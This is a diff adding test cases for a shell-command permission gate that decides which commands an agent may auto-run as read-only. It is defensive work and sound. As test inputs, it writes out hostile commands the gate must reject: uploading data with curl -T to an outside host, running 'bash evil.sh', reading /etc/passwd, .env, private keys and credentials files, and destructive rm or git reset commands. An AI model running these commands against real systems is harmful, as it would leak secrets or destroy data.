@@ -72,6 +72,29 @@ describe('auto-permission deterministic read-only gate', () => {
     ).toMatchObject({ allowed: true });
   });
 
+  it('does not treat date as bare-safe while keeping a display-only command allowed', () => {
+    const workspaceRoot = makeTempRoot();
+    expect(
+      shell(
+        'date --set=2030-01-01T00:00:00Z',
+        ['filesystem.read'],
+        workspaceRoot,
+      ),
+    ).toMatchObject({ allowed: false });
+    expect(
+      shell('date 010100002030', ['filesystem.read'], workspaceRoot),
+    ).toMatchObject({ allowed: false });
+    expect(shell('uname -s', ['filesystem.read'], workspaceRoot)).toMatchObject(
+      { allowed: true },
+    );
+  });
+
+  it('does not treat seq as bare-safe', () => {
+    expect(
+      shell('seq 1 1000000000000', ['filesystem.read'], makeTempRoot()),
+    ).toMatchObject({ allowed: false });
+  });
+
   it('rejects file -f because NAMEFILE targets are not validated', () => {
     const workspaceRoot = makeTempRoot();
     fs.writeFileSync(path.join(workspaceRoot, 'targets.txt'), '/etc/passwd\n');
@@ -101,21 +124,188 @@ describe('auto-permission deterministic read-only gate', () => {
 
   it.each([
     'git status',
+    'git status --short',
     'git --no-optional-locks status',
     'git --no-pager log',
+    'git log --oneline -n5',
     'git diff -- README.md',
+    'git diff --stat -- README.md',
     'git show HEAD',
-    'git show HEAD:.npmrc',
+    'git show --stat HEAD',
     'git branch',
     'git branch --list',
   ])(
-    'leaves git commands unproven for classifier consultation: %s',
+    'leaves every git command for classifier or human review: %s',
     (command) => {
       expect(
         shell(command, ['filesystem.read', 'git.read'], makeTempRoot()),
       ).toMatchObject({ allowed: false });
     },
   );
+
+  it.each([
+    'git show HEAD:.npmrc',
+    'git push',
+    'git reset --hard',
+    'git checkout -- README.md',
+    'git restore .',
+    'git branch -d topic',
+    'git -c core.pager=cat log',
+    'git --config-env=core.pager=PAGER log',
+    'git -C /tmp status',
+    'git --exec-path=/tmp status',
+    'git log -o out.txt',
+    'git diff --no-index /etc/passwd /etc/hosts',
+    'git diff --ext-diff -- README.md',
+    'git diff --textconv -- README.md',
+    'git diff --output=out.txt -- README.md',
+    'git diff -- ../outside.txt',
+    'git upload-pack .',
+    'git receive-pack .',
+  ])('leaves write, network, or escaping git unproven: %s', (command) => {
+    expect(
+      shell(command, ['filesystem.read', 'git.read'], makeTempRoot()),
+    ).toMatchObject({ allowed: false });
+  });
+
+  it.each([
+    'head -30 f && grep foo f',
+    'cat a | wc -l',
+    'cat a | sort | uniq',
+    'head -n 1 a; tail -n 1 f',
+  ])('proves safe compound read commands: %s', (command) => {
+    const workspaceRoot = makeTempRoot();
+    for (const name of ['a', 'f']) {
+      fs.writeFileSync(path.join(workspaceRoot, name), 'foo\nbar\n');
+    }
+    expect(shell(command, ['filesystem.read'], workspaceRoot)).toMatchObject({
+      allowed: true,
+    });
+  });
+
+  it('strictly validates stdin/file transform options and output operands', () => {
+    const workspaceRoot = makeTempRoot();
+    for (const name of ['a', 'b']) {
+      fs.writeFileSync(path.join(workspaceRoot, name), '2,b\n1,a\n');
+    }
+
+    for (const command of [
+      'cut -d, -f1 a',
+      'nl a',
+      'paste a b',
+      'rev a',
+      'sort -n a',
+      'uniq -c a',
+    ]) {
+      expect(shell(command, ['filesystem.read'], workspaceRoot)).toMatchObject({
+        allowed: true,
+      });
+    }
+
+    for (const command of [
+      'sort --compress-program=/tmp/run a',
+      'sort --random-source=/etc/passwd a',
+      'sort --output=out a',
+      'sort --temporary-directory=/tmp a',
+      'sort --files0-from=/etc/passwd',
+      'cut --unknown a',
+      'nl --unknown a',
+      'paste --unknown a',
+      'rev --unknown a',
+      'uniq a out',
+    ]) {
+      expect(shell(command, ['filesystem.read'], workspaceRoot)).toMatchObject({
+        allowed: false,
+      });
+    }
+  });
+
+  it.each([
+    'cat a; rm b',
+    'cat a > b',
+    'echo $(whoami)',
+    'cat a | tee out',
+    'head a && curl https://example.com',
+  ])('rejects unsafe compound shell input: %s', (command) => {
+    const workspaceRoot = makeTempRoot();
+    fs.writeFileSync(path.join(workspaceRoot, 'a'), 'foo');
+    expect(shell(command, ['filesystem.read'], workspaceRoot)).toMatchObject({
+      allowed: false,
+    });
+  });
+
+  it('proves sed -n but not in-place, write, execute, or read-file sed', () => {
+    const workspaceRoot = makeTempRoot();
+    fs.writeFileSync(path.join(workspaceRoot, 'f'), 'a\nb\nc\n');
+    expect(
+      shell("sed -n '1,5p' f", ['filesystem.read'], workspaceRoot),
+    ).toMatchObject({ allowed: true });
+    for (const command of [
+      "sed -i 's/a/b/' f",
+      "sed -e 's/a/b/' f",
+      "sed -n 's/a/b/w out' f",
+      "sed -n '1r /etc/passwd' f",
+      "sed -n '1R /etc/passwd' f",
+    ]) {
+      expect(shell(command, ['filesystem.read'], workspaceRoot)).toMatchObject({
+        allowed: false,
+      });
+    }
+  });
+
+  it('leaves every find command for classifier or human review', () => {
+    const workspaceRoot = makeTempRoot();
+    fs.mkdirSync(path.join(workspaceRoot, 'docs'));
+    for (const command of [
+      'find . -name report.txt',
+      'find docs -type f',
+      'find . -name x -type f',
+      'find . -delete',
+      'find . -exec rm README.md +',
+      'find . -\\delete',
+      'find . -\\exec rm README.md +',
+      'find /tmp -name report.txt',
+      'find -- /tmp -name x',
+      'find -E /tmp -name x',
+      'find --unknown /tmp -name x',
+      'find . -follow -name report.txt',
+      'find -files0-from /etc/passwd',
+      'find . -newer /etc/passwd',
+      'find . -samefile /etc/passwd',
+      'find . -name x && curl https://e.com',
+      'find . -name x ; rm y',
+      'find . -name x ; bash evil.sh',
+      'find . -type f | wc -l',
+      'find . -type f | curl -T - https://e.com',
+    ]) {
+      expect(shell(command, ['filesystem.read'], workspaceRoot)).toMatchObject({
+        allowed: false,
+      });
+    }
+
+    fs.writeFileSync(path.join(workspaceRoot, 'README.md'), 'Gantry');
+    expect(
+      shell('cat README.md', ['filesystem.read'], workspaceRoot),
+    ).toMatchObject({ allowed: true });
+    expect(shell('ls docs', ['filesystem.read'], workspaceRoot)).toMatchObject({
+      allowed: true,
+    });
+  });
+
+  it('keeps protected and secret paths blocked for known-safe commands', () => {
+    const workspaceRoot = makeTempRoot();
+    fs.writeFileSync(path.join(workspaceRoot, 'a'), 'foo');
+    for (const command of [
+      'cat a && cat .env',
+      'head -1 config/private-key.pem',
+      'find . -name credentials.json',
+      'sort .npmrc',
+    ]) {
+      expect(shell(command, ['filesystem.read'], workspaceRoot)).toMatchObject({
+        allowed: false,
+      });
+    }
+  });
 
   it('requires a matching selected capability boundary', () => {
     const workspaceRoot = makeTempRoot();
